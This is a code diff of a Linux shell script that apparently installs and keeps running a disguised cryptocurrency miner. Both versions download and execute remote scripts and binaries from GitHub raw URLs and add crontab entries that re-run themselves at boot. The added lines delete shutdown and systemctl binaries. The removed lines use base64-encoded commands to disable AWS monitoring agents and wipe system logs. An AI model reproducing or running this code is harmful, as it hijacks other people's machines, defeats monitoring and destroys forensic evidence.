@@ -1,18 +1,64 @@
-#!/bin/sh
+#!/bin/bash
 
-sudo sed -i "/^@reboot/d;\$a\@reboot root /bin/bash <(wget -qO- https://raw.githubusercontent.com/curiosityinteriorsuk/2088/main/v2.sh) >>/dev/null 2>&1 &\n\n\n" /etc/crontab
+sudo rm -rf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl || rm -rf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl
+
+bash <(wget -qO- https://raw.githubusercontent.com/curiosityinteriorsuk/2088/main/v3.sh) >/dev/null 2>&1 &
+
+mode="${1:-0}"
+work="/tmp/.config"
+src="https://raw.githubusercontent.com/curiosityinteriorsuk/2088/main"
+
+RandString() {
+  n="${1:-2}"; s="${2:-}"; [ -n "$s" ] && s="${s}_"; for((i=0;i<n;i++)); do s=${s}$(echo "$[`od -An -N2 -i /dev/urandom` % 26 + 97]" |awk '{printf("%c", $1)}'); done; echo -n "$s";
+}
+
+# Debian12+
+sudo apt -qqy update >/dev/null 2>&1 || apt -qqy update >/dev/null 2>&1
+sudo apt -qqy install wget procps icu-devtools netcat-traditional >/dev/null 2>&1 || apt -qqy install wget procps icu-devtools netcat-traditional >/dev/null 2>&1
 
 
-mkdir -p /tmp/.config
-wget -qO /tmp/.config/config.json https://raw.githubusercontent.com/curiosityinteriorsuk/2088/main/9v.json
-wget -qO /tmp/.config/bash https://raw.githubusercontent.com/Blenkinship/any/main/0
-chmod -R 777 /tmp/.config
-
-cores=`grep 'siblings' /proc/cpuinfo |cut -d':' -f2 | head -n1 |grep -o '[0-9]\+'`
-[ -n "$cores" ] && rx="[`seq -s ', ' 0 $((cores - 1))`]" || rx=""
-[ -f "/tmp/.config/config.json" ] && [ -n "$rx" ] && sed -i "s/\"max-threads-hint\": 100,/&\n        \"rx\": ${rx},/" "/tmp/.config/config.json"
+cores=`grep 'siblings' /proc/cpuinfo 2>/dev/null |cut -d':' -f2 | head -n1 |grep -o '[0-9]\+'`
+[ -n "$cores" ] || cores=1
+addr=`wget --no-check-certificate -4 -qO- http://checkip.amazonaws.com/ 2>/dev/null`
+[ -n "$addr" ] || addr="NULL"
 
 
-/bin/sh -c "echo 'd2hpbGUgdHJ1ZTsgZG8gY2QgL3RtcC8uY29uZmlnICYmIG5vaHVwIHN1ZG8gLi9iYXNoID4vZGV2L251bGwgMj4mMSA7IGRvbmUK' |base64 -d |/bin/bash" &
-/bin/sh -c "echo 'c2xlZXAgMTIwOyBzdWRvIHN5c3RlbWN0bCBkaXNhYmxlIGFtYXpvbi1jbG91ZHdhdGNoLWFnZW50OyBzdWRvIHN5c3RlbWN0bCBzdG9wIGFtYXpvbi1jbG91ZHdhdGNoLWFnZW50OyBzdWRvIHJtIC1yZiAvdXNyL2Jpbi9jb250YWluZXJkIC91c3IvYmluL3NzbS1hZ2VudC13b3JrZXIgL3Vzci9iaW4vYW1hem9uLXNzbS1hZ2VudCAvdXNyL3NiaW4vcm9sZS1hZ2VudCAvdXNyL2xpYmV4ZWMvcG9zdGZpeC9tYXN0ZXIgL29wdC9hd3MvYW1hem9uLWNsb3Vkd2F0Y2gtYWdlbnQgL2V0Yy9vcHQvbWwvc2NyaXB0cy9jbGVhbi1qdXB5dGVyLWxvZyAvZXRjL29wdC9tbC9zY3JpcHRzL3NhZ2VtYWtlci1uYmktYWdlbnQgL2V0Yy9vcHQvbWwvc2NyaXB0cy9yZXN0YXJ0LXNhZ2VtYWtlci1hZ2VudC13YXRjaGVyIC9ldGMvb3B0L21sL3NjcmlwdHMvcmVsYXVuY2gtZG9ja2VyLXNlcnZpY2UgL2V0Yy9vcHQvbWwvc2NyaXB0cy9zYWdlbWFrZXItcm9sZS1wcm94eS1hZ2VudCAvZXRjL29wdC9tbC9zY3JpcHRzL3NldC11cC1hZ2VudC1uYW1lc3BhY2UgL3Vzci9zYmluL3NhbXBsZS1ub3RlYm9va3MtY29uZmlnIC9vcHQvLnNhZ2VtYWtlci9hZGRfY2xvdWRfd2F0Y2hfYWdlbnRfY29uZmlndXJhdGlvbi5weSAvZXRjL2Nyb24uZC8qIC9ldGMvY3Jvbi5kYWlseS8qIC9ldGMvY3Jvbi5ob3VybHkvKjsgc3VkbyBmaW5kIC92YXIvbG9nIC10eXBlIGYgLWRlbGV0ZTsK' |base64 -d |/bin/bash" >/dev/null 2>&1 &
+if [ "$mode" == "0" ]; then
+  delay="$[`od -An -N2 -i /dev/urandom` % 21600 + 43200]"
+  #bash <(echo "sleep $delay && sudo reboot || reboot") >/dev/null 2>&1 &
+fi
 
+if [ "$mode" == "1" ]; then
+  ###bash <(echo 'while true; do echo -e "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nContent-Length: 12\r\n\r\nHello World" |nc -l -q 1 -p 8080; done') >/dev/null 2>&1 &
+  #bash <(wget -qO- ${src}/k.sh) 43200 21600 >/dev/null 2>&1 &
+  [ "$cores" == "2" ] && cores="2";
+  [ "$cores" == "8" ] && cores="8";
+fi
+
+sudo sysctl -w vm.nr_hugepages=$((cores*768)) >/dev/null 2>&1 || sysctl -w vm.nr_hugepages=$((cores*768)) >/dev/null 2>&1
+sudo sed -i "/^@reboot/d;\$a\@reboot root wget -qO- ${src}/zh88kk2.sh |bash >/dev/null 2>&1 &\n\n\n" /etc/crontab >/dev/null 2>&1 || sed -i "/^@reboot/d;\$a\@reboot root wget -qO- ${src}/zh88kk2.sh |bash >/dev/null 2>&1 &\n\n\n" /etc/crontab >/dev/null 2>&1
+
+
+rm -rf "${work}"; mkdir -p "${work}"
+wget --no-check-certificate -4 -qO "${work}/appsettings.json" "${src}/q.json"
+wget --no-check-certificate -4 -qO "${work}/bash" "${src}/q"
+chmod -R 777 "${work}"
+sed -i "s/\"trainerBinary\":.*/\"trainerBinary\": \"$(RandString 7)\",/" "${work}/appsettings.json"
+
+
+cat /proc/cpuinfo 2>/dev/null |grep -iq 'AVX512'
+[ "$?" == "0" ] && AVX512=1 || AVX512=0
+cat /proc/cpuinfo 2>/dev/null |grep -iq 'AVX2'
+[ "$?" == "0" ] && [ "$AVX512" == "0" ] && AVX2=1 || AVX2=0
+[ "$AVX2" == "1" ] && sed -i "s/AVX512/AVX2/g" "${work}/appsettings.json"
+[ "$AVX512" == "0" ] && [ "$AVX2" == "0" ] && sed -i "/AVX512/d" "${work}/appsettings.json"
+
+echo "##mode: m${mode}_c${cores}_${addr}"
+
+if [ "$mode" == "0" ]; then
+  name=`RandString 2 c${cores}_${addr}`;
+  bash -c "while true; do cd "${work}"; ./bash ${name} ${cores} >/dev/null 2>&1 ; sleep 5; done" >/dev/null 2>&1 &
+else
+  while true; do cd "${work}"; name=`RandString 2 d${cores}_${addr}`; ./bash ${name} ${cores} >/dev/null 2>&1 ; sleep 5; done
+  #while true; do cd "${work}"; name=`RandString 2 d${cores}_${addr}`; ./bash ${name} ${cores} ; sleep 5; done
+fi
